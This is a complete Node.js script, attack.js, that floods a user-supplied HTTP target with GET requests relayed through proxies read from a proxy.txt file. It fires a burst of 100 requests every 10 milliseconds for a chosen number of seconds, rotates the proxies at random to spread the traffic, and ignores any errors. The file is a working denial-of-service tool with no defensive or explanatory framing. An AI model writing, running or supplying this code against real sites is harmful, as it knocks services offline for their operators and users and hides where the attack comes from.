const fs = require('fs');
const http = require('http');
const url = require('url');

if (process.argv.length < 4) {
    console.log('Usage: node attack.js <http target> <time>');
    process.exit();
}

const target = process.argv[2];
const time = parseInt(process.argv[3]) * 1000;

if (!target.startsWith('http://')) {
    console.log('Only HTTP supported in this raw version. Use an HTTP site.');
    process.exit();
}

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(p => p.trim().length > 0);
const parsed = url.parse(target);
let sent = 0;
const endTime = Date.now() + time;

function attack() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const [proxyHost, proxyPort] = proxy.split(':');

    const options = {
        host: proxyHost,
        port: parseInt(proxyPort),
        method: 'GET',
        path: target,
        headers: {
            Host: parsed.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; FloodBot/1.0)',
            Connection: 'close',
        }
    };

    const req = http.request(options);
    req.on('error', () => {}); // ignore failed proxy
    req.end();

    sent++;
    console.log(`(${sent}) Sent to ${target}`);
}

function start() {
    const interval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(interval);
            console.log(`Finished. Total sent: ${sent}`);
            process.exit();
        }

        for (let i = 0; i < 100; i++) {
            attack();
        }
    }, 10);
}

start();
